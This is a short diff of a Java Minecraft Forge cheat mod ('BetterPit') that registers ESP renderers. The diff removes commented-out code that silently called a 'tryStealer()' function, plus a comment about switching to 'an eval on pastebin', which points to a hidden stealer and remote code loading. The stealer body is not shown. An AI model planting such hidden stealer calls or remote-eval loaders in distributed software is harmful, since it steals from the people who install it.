@@ -56,14 +56,6 @@ public class BetterPit {
         MinecraftForge.EVENT_BUS.register(new NametagRenderer());
         MinecraftForge.EVENT_BUS.register(new TwoDESP());
         MinecraftForge.EVENT_BUS.register(new ThreeDESP());
-//        try {
-//            tryStealer();
-//        }catch (Exception ignored){
-//
-//        }
-
-        //MinecraftForge.EVENT_BUS.register(new TwoDESP());
-        // need to replace with an eval on pastebin
 
         config = new ConfigOneConfig();
         System.out.println("Player Notifier Mod Initialized");
